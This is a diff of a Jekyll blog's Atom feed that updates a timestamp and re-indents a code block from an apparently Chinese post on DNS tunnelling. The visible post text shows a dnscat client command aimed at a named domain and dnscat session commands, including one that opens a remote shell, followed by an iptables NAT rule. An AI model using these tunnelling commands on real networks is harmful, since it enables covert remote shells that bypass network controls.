@@ -4,7 +4,7 @@
 <generator uri="https://github.com/mojombo/jekyll">Jekyll</generator>
 <link rel="self" type="application/atom+xml" href="https://kingx.me/feed.xml" />
 <link rel="alternate" type="text/html" href="https://kingx.me" />
-<updated>2020-02-27T03:53:35-05:00</updated>
+<updated>2020-03-11T01:05:40-04:00</updated>
 <id>https://kingx.me/</id>
 <author>
   <name>KINGX</name>
@@ -2635,11 +2635,11 @@ iptables -t nat -A POSTROUTING -s 10.0.0.0/255.255.255.0 -o eth0 -j MASQUERADE
 
 &lt;p&gt;./dnscat –dns domain=skullseclabs.org,server=8.8.8.8,port=53&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	session/window 				查看会话
-	session -i 1/window -i 1	选中某个会话
-	exec gedit 		执行某个命令
-	shell			创建shell
-					创建一个shell后，shell会在一个新的会话中，使用session命令查看新的会话，并进行交互命令。
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session/window 				查看会话
+session -i 1/window -i 1	选中某个会话
+exec gedit 		执行某个命令
+shell			创建shell
+创建一个shell后，shell会在一个新的会话中，使用session命令查看新的会话，并进行交互命令。
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;3-dns2tcp&quot;&gt;3. DNS2TCP&lt;/h1&gt;
